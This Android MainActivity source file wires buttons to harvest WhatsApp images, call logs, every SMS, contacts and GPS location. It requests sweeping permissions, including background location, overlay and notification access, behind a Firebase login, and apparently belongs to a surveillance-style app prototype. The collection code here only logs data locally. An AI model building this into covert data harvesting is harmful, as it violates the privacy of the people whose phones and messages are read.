package com.hazyaz.temps;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.support.annotation.RequiresApi;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import com.google.firebase.FirebaseApp;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.hazyaz.temps.CallLogs.GetCallLogs;
import com.hazyaz.temps.Contacts.Contacts;
import com.hazyaz.temps.GPS.GPSTracker;
import com.hazyaz.temps.Media.GetImages;
import com.hazyaz.temps.Message.MessageReceiver;

public class MainActivity extends AppCompatActivity {
    private static final int APP_PERMISSION_REQUEST = 1;
    public final String[] EXTERNAL_PERMS = {Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.READ_EXTERNAL_STORAGE
            , Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.READ_CONTACTS, Manifest.permission.ACCESS_BACKGROUND_LOCATION
            , Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION
    };
    public final int EXTERNAL_REQUEST = 138;
    private FirebaseAuth mAuth;
    public static Context context;

    private Button whatsAppBtn;
    private Button notificationBtn;
    private Button callLogs;
    private Button contacts;
    private Button messages;
    private Button location;
    private Button takeImage;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        FirebaseApp.initializeApp(MainActivity.this);

        mAuth = FirebaseAuth.getInstance();

        context = getApplicationContext();
        requestForPermission();

//        to get whatsapp images
        whatsAppBtn = findViewById(R.id.whatsappBtn);
        whatsAppBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                GetImages obj = new GetImages();
            }
        });

//        to get noticatin s
        notificationBtn = findViewById(R.id.notificationBtn);
        notificationBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                showPermissionDialog();
            }
        });

//to get call logs
        callLogs = findViewById(R.id.callLogs);
        callLogs.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                GetCallLogs getCallLogs = new GetCallLogs();
                String callrec = getCallLogs.getCallDetails(getApplicationContext());
                Log.d("call logs", callrec);

            }
        });
// to get messages
        messages = findViewById(R.id.messages);
        messages.setOnClickListener(new View.OnClickListener() {
            @RequiresApi(api = Build.VERSION_CODES.KITKAT)
            @Override
            public void onClick(View v) {
                MessageReceiver messageReceiver = new MessageReceiver();
                String messages = messageReceiver.getAllSms(getApplicationContext());
                Log.d("messages ", messages);
            }
        });


//        to get Contacts
        contacts = findViewById(R.id.contacts);
        contacts.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Contacts contacts = new Contacts();
                contacts.getContactList(getContentResolver());

            }
        });


//        get location
        location = findViewById(R.id.location);
        location.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                GPSTracker gpsTracker = new GPSTracker(getApplicationContext());
                Log.d("loasdsd", "" + gpsTracker.getLocation());

            }
        });


        takeImage = findViewById(R.id.takeImage);
        takeImage.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                
            }
        });


    }

    public void showPermissionDialog() {
        getApplicationContext().startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS").addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
    }

    @Override
    public void onStart() {
        super.onStart();
        FirebaseApp.initializeApp(MainActivity.this);

        mAuth = FirebaseAuth.getInstance();

        // Check if user is signed in (non-null) and update UI accordingly.
        FirebaseUser currentUser = mAuth.getCurrentUser();
        if (currentUser == null) {
            Intent t = new Intent(MainActivity.this, Login.class);
            startActivity(t);
        }
    }


    public boolean requestForPermission() {

        boolean isPermissionOn = true;
        final int version = Build.VERSION.SDK_INT;

        if (version >= 23) {

            if (!(PackageManager.PERMISSION_GRANTED == ContextCompat.checkSelfPermission(this, android.Manifest.permission.WRITE_EXTERNAL_STORAGE))) {
                isPermissionOn = false;
                requestPermissions(EXTERNAL_PERMS, EXTERNAL_REQUEST);
            }

            if (!(PackageManager.PERMISSION_GRANTED == ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG))) {
                isPermissionOn = false;
                requestPermissions(EXTERNAL_PERMS, EXTERNAL_REQUEST);
            }
            if (!(PackageManager.PERMISSION_GRANTED == ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS))) {
                isPermissionOn = false;
                requestPermissions(EXTERNAL_PERMS, EXTERNAL_REQUEST);
            }
            if (!(PackageManager.PERMISSION_GRANTED == ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS))) {
                isPermissionOn = false;
                requestPermissions(EXTERNAL_PERMS, EXTERNAL_REQUEST);
            }
            if (!(PackageManager.PERMISSION_GRANTED == ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION))) {
                isPermissionOn = false;
                requestPermissions(EXTERNAL_PERMS, EXTERNAL_REQUEST);
            }
            if (!(PackageManager.PERMISSION_GRANTED == ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION))) {
                isPermissionOn = false;
                requestPermissions(EXTERNAL_PERMS, EXTERNAL_REQUEST);
            }
            if (!(PackageManager.PERMISSION_GRANTED == ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION))) {
                isPermissionOn = false;
                requestPermissions(EXTERNAL_PERMS, EXTERNAL_REQUEST);
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, APP_PERMISSION_REQUEST);
            }


        }

        return isPermissionOn;
    }


//    public boolean canAccessExternalSd() {
//        return (hasPermission(android.Manifest.permission.WRITE_EXTERNAL_STORAGE));
//    }
//
//    private boolean hasPermission(String perm) {
//        return (PackageManager.PERMISSION_GRANTED == ContextCompat.checkSelfPermission(this, perm));
//
//    }
}
